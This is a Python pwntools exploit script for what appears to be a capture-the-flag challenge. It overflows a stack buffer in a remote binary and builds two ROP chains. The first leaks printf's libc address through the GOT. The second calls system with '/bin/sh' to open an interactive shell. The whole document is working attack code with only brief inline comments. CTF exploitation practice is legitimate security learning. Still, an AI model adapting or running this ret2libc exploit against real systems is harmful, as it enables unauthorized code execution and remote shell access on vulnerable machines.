from pwn import * 

# open the binary 
binary = "./program_patched"

p = process(binary)
p = remote("chal.firebird.sh", 35036)
elf = ELF(binary)
libc = ELF("./libc.so.6")
context.log_level = 'debug'
s = 'b * main'
#gdb.attach(p, s)
p.recvuntil(b"name???\n")
context.binary = binary
# Print available PLT entries
print("Available PLT functions:")
for func in elf.plt:
    print(f"- {func}")

# Print available GOT entries
print("\nAvailable GOT functions:")
for func in elf.got:
    print(f"- {func}")

payload = flat(
    b'A' * 0x10, # fill up the buffer up to rbp 
    b'B' * 8, # old rbp

    # leak libc base address 
    p64(0x0000000000400511),
    p64(0x0000000000400783), # pop rdi; ret 
    p64(elf.got['printf']),
    p64(elf.plt['printf']),
    p64(0x0000000000400676) # return back to the same function again!
)
p.sendline(payload)
GOT_leak = int.from_bytes(p.recvuntil(b"name???", drop = True), 'little')
#print(hex(GOT_leak))
libc.address = GOT_leak - libc.sym['printf']
#print(hex(libc.address))
print(hex(libc.sym['system']))
#print(hex(elf.got['system']))
# Receive and parse the leak
payload2 = flat(
    b'A' * 0x10, # fill up the buffer up to rbp 
    b'B' * 8, # old rbp
    
    p64(0x0000000000400783),
    next(libc.search('/bin/sh')),
    p64(libc.sym['system'])
)
p.sendline(payload2)

p.interactive()


'''
'''